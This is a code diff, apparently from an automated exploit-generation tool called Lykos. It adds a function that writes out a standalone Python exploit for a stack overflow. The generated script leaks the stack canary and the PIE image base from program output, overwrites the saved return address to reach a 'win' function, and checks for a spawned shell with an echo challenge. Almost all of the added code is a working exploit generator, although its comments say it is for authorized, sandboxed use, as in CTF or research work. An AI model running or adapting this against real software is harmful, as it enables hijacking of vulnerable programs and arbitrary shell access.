@@ -1335,6 +1335,13 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
                 if markers.proves(out):
                     return {"ok": True, "canary": canary, "pie_base": (pie_base if pie else None),
                             "win": base + int(win_off),
+                            # the resolved parameters the live run used, so a bundle can render a
+                            # self-contained reproducer that re-leaks and redirects the same way.
+                            "repro": {"canary_offset": co, "ret_offset": ro,
+                                      "canary_trigger": bytes(canary_trigger), "pie": bool(pie),
+                                      "win_off": int(win_off), "canary_index": canary_index,
+                                      "canary_regex": canary_regex, "align": bool(align),
+                                      "loop_feed": bytes(loop_feed or b"")},
                             "output": out[:400].decode("latin-1", "ignore")}
             finally:
                 for s in (p.stdin, p.stdout):
@@ -1353,6 +1360,93 @@ def canary_pie_ret2win(exe, workdir, *, canary_trigger=b"", canary_offset=None, 
         "leak, or the redirect did not confirm") if pie else (
         "no-PIE+canary ret2win: could not leak the canary from the trigger, or the redirect to win "
         "did not confirm")}
+
+
+def render_canary_ret2win_script(*, repro, target_bytes=b"", image_anchors=None) -> bytes:
+    """Self-contained reproducer for a gadget-free ret2win PAST A STACK CANARY. The canary is
+    per-process random so no static input can exist: the script leaks it (and, when PIE, the image
+    base) from the same dump, writes the canary back, and redirects the saved return to the win --
+    exactly as `canary_pie_ret2win` confirmed. `repro` is that function's returned parameters.
+
+    No-PIE: `win_off` is the absolute win address. PIE: the win is `base + win_off`, and the base
+    is corroborated from `image_anchors` (page_offset -> [image vaddr]) across >=2 leaked slots,
+    the same rule as `exploit.recover_pie_base`. Grades itself with an arithmetic challenge a real
+    shell evaluates (the win spawns one), printing [+] / [-]."""
+    pie = bool(repro.get("pie"))
+    # The alignment ret-slide applies on BOTH no-PIE and PIE (system()/do_system needs a 16-byte
+    # aligned rsp); its gadget is a static image offset relocated by `base` (0 on no-PIE).
+    align_ret = None
+    if repro.get("align"):
+        from . import rop
+        align_ret = rop.find_gadget(target_bytes, "ret") or 0
+    return (
+        "#!/usr/bin/env python3\n"
+        "# Lykos L3 reproducer: gadget-free ret2win past a stack canary. Authorized use only.\n"
+        "# RUN IN A SANDBOX/VM -- this executes an untrusted binary and spawns a shell from it.\n"
+        "import os, random, re, select, struct, subprocess, sys, time\n"
+        "q = lambda v: struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
+        "EXE = sys.argv[1] if len(sys.argv) > 1 else './target.bin'\n"
+        f"CANARY_OFF={repro['canary_offset']}; RET_OFF={repro['ret_offset']}; "
+        f"WIN_OFF={repro['win_off']:#x}; PIE={pie}\n"
+        f"ALIGN_RET={(align_ret or 0):#x}\n"
+        f"TRIGGER={bytes(repro['canary_trigger'])!r}; FEED={bytes(repro.get('loop_feed') or b'')!r}\n"
+        f"REGEX={repro.get('canary_regex', r'0x[0-9a-fA-F]+')!r}; "
+        f"IDX={repro['canary_index'] if repro.get('canary_index') is not None else 'None'}\n"
+        f"ANCHORS={(image_anchors or {})!r}\n"
+        "def read_until(p, deadline, quiet=0.3):\n"
+        "    out, last = b'', time.time()\n"
+        "    while time.time() < deadline:\n"
+        "        r, _, _ = select.select([p.stdout], [], [], 0.1)\n"
+        "        if r:\n"
+        "            c = os.read(p.stdout.fileno(), 4096)\n"
+        "            if not c: break\n"
+        "            out, last = out + c, time.time()\n"
+        "        elif p.poll() is not None: break\n"
+        "        elif out and time.time() - last > quiet: break\n"
+        "    return out\n"
+        "def find_canary(vals):\n"                            # low byte 0x00, high entropy, not a ptr
+        "    for v in vals:\n"
+        "        if v & 0xFF or v >> 8 == 0 or v < 0x1000000000000: continue\n"
+        "        if 0x550000000000 <= v <= 0x5FFFFFFFFFFF or 0x7F0000000000 <= v <= 0x7FFFFFFFFFFF:\n"
+        "            continue\n"
+        "        return v\n"
+        "    return None\n"
+        "def pie_base(vals):\n"
+        "    sup = {}\n"
+        "    for v in set(vals):\n"
+        "        for va in ANCHORS.get(v & 0xfff, []):\n"
+        "            b = v - va\n"
+        "            if b > 0 and b % 0x1000 == 0: sup.setdefault(b, set()).add(v)\n"
+        "    b = max(sup, key=lambda k: len(sup[k]), default=None)\n"
+        "    return b if (b and len(sup[b]) >= 2) else None\n"
+        "for _ in range(4):\n"
+        "    p = subprocess.Popen([EXE], stdin=subprocess.PIPE, stdout=subprocess.PIPE,\n"
+        "                         stderr=subprocess.STDOUT)\n"
+        "    read_until(p, time.time() + 0.5)\n"
+        "    if TRIGGER: p.stdin.write(TRIGGER); p.stdin.flush()\n"
+        "    dump = read_until(p, time.time() + 3)\n"
+        "    vals = [int(m.group(0), 16) for m in re.finditer(REGEX.encode(), dump)]\n"
+        "    canary = vals[IDX] if (IDX is not None and -len(vals) <= IDX < len(vals)) else find_canary(vals)\n"
+        "    base = pie_base(vals) if PIE else 0\n"
+        "    if canary is None or (PIE and not base): p.kill(); continue\n"
+        "    pre = b'A'*CANARY_OFF + q(canary) + b'B'*max(0, RET_OFF - CANARY_OFF - 8)\n"
+        "    payload = bytearray(pre)\n"
+        "    if ALIGN_RET: payload += q(base + ALIGN_RET)\n"
+        "    payload += q(base + WIN_OFF)\n"
+        "    try:\n"
+        "        p.stdin.write(bytes(payload)); p.stdin.flush(); time.sleep(0.2)\n"
+        "        if FEED: p.stdin.write(FEED); p.stdin.flush()\n"
+        "        a, b = random.randint(1000, 9999), random.randint(1000, 9999)\n"
+        "        p.stdin.write(b'echo LYKOS_SHELL_$((%d*%d))\\n' % (a, b)); p.stdin.flush()\n"
+        "    except (BrokenPipeError, OSError): p.kill(); continue\n"
+        "    out = read_until(p, time.time() + 6, quiet=1.5)\n"
+        "    if (b'LYKOS_SHELL_%d' % (a*b)) in out:\n"
+        "        sys.stdout.write(out.decode('latin-1', 'ignore'))\n"
+        "        print('\\n[+] canary %#x bypassed, win reached, shell evaluated the challenge' % canary)\n"
+        "        sys.exit(0)\n"
+        "    p.kill()\n"
+        "print('[-] canary ret2win did not confirm'); sys.exit(1)\n"
+    ).encode()
 
 
 def canary_ret2win(exe, workdir, *, win_addr, **kw) -> dict:
